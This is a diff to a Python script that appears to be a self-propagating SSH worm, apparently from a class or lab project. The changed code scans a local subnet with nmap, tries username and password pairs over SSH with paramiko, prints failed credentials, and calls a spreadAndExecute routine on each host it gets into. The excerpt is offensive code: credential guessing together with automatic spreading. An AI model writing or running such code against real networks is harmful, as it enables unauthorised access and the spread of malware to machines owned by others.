@@ -150,13 +150,14 @@ def tryCredentials(host, userName, password, sshClient):
 	# Desirae Prather
 	try:
 		sshClient.connect(host, username=userName, password=password)
-	except socket.error:
+	except socket.error as e:
 		# probably the server is down or is not running SSH
-		print("Error: Host is unreachable")
+		# print("Error: Host is unreachable")
+		print(str(e))
 		return 3
 	except paramiko.SSHException:
 		# probably wrong credentials
-		print("Error: Incorrect credentials. Failed to establsh SSH connection.")
+		print("Error: Incorrect credentials. user:",userName," pass:",password," Failed to establsh SSH connection.")
 		return 1
 		
 	return 0
@@ -251,16 +252,16 @@ def getHostsOnTheSameNetwork():
 	# IP addresses.
 	nmScan = nmap.PortScanner()
 
-	nmScan.scan('10.0.0.0/24', arguments='--open')
+	nmScan.scan('10.0.0.0/24')
 	# kevin
 	hostInfo = nmScan.all_hosts()
 	liveHosts = []
 	for host in hostInfo:
 		# uncomment this to add even non running hosts
-		# liveHosts.append(host)
+		liveHosts.append(host)
 		# otherwise we're only going to add running hosts
-		if nmScan[host].state() == "up":
-			liveHosts.append(host)
+		# if nmScan[host].state() == "up":
+			# liveHosts.append(host)
 	# /kevin
 	return liveHosts
 
@@ -312,6 +313,7 @@ networkHosts = getHostsOnTheSameNetwork()
 # kevin temporary
 try:
 	networkHosts.remove(currentIP)
+	networkHosts.remove('10.0.0.1')
 except ValueError:
 	print("we got a value error but go on...")
 
@@ -337,5 +339,3 @@ for host in networkHosts:
 		spreadAndExecute(sshInfo[0])
 		
 		print("Spreading complete")
-	
-
